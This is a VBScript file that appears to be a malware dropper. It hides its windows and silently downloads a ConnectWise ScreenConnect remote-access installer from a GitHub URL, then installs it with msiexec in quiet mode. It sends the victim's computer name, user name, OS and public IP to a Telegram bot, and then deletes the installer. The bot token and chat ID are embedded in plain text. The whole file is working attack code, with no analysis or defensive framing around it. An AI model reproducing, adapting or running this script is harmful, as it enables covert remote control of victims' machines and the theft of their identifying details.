' --- Telegram Configuration ---
Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH

BOT_TOKEN = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
CHAT_ID = "8345342738"
PACKAGE_URL = "https://github.com/kemo828/screen/raw/refs/heads/main/ConnectWiseControl.ClientSetup.msi"
TEMP_PATH = "C:\Temp\sc.msi"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' 1. Create Temp Directory
If Not objFSO.FolderExists("C:\Temp") Then
    objFSO.CreateFolder("C:\Temp")
End If

' 1a. Cleanup any old sc.msi or patch.msi files
Dim oldFiles, file
oldFiles = Array("C:\Temp\sc.msi", "C:\Temp\patch.msi")
For Each file In oldFiles
    If objFSO.FileExists(file) Then
        objFSO.DeleteFile(file)
    End If
Next

' 2. Download File
Dim downloadCmd
downloadCmd = "powershell -ExecutionPolicy Bypass -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('" & PACKAGE_URL & "', '" & TEMP_PATH & "')"""
objShell.Run downloadCmd, 0, True

' 3. Install MSI silently
Dim installCmd
installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"
intReturn = objShell.Run(installCmd, 0, True)

' 4. Send Telegram Notification
Dim notifyCmd
notifyCmd = "powershell -ExecutionPolicy Bypass -Command "" " & _
            "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
            "$ip = (Invoke-WebRequest -uri 'https://api.ipify.org' -UseBasicParsing).Content; " & _
            "$os = (Get-WmiObject -Class Win32_OperatingSystem).Caption; " & _
            "$dt = Get-Date -Format 'M/d/yyyy h:mm:ss tt'; " & _
            "$msg = '=== SCREENCONNECT MONITOR STARTED ===' + [char]10 + [char]10 + 'Computer: ' + $env:COMPUTERNAME + [char]10 + 'User: ' + $env:USERNAME + [char]10 + 'OS: ' + $os + [char]10 + 'Time: ' + $dt + [char]10 + 'IP: ' + $ip; " & _
            "$url = 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage'; " & _
            "$body = @{ chat_id = '" & CHAT_ID & "'; text = $msg }; " & _
            "Invoke-RestMethod -Uri $url -Method Post -Body $body -UseBasicParsing"""
objShell.Run notifyCmd, 0, True

' 5. Cleanup the downloaded MSI
If objFSO.FileExists(TEMP_PATH) Then
    objFSO.DeleteFile(TEMP_PATH)
End If
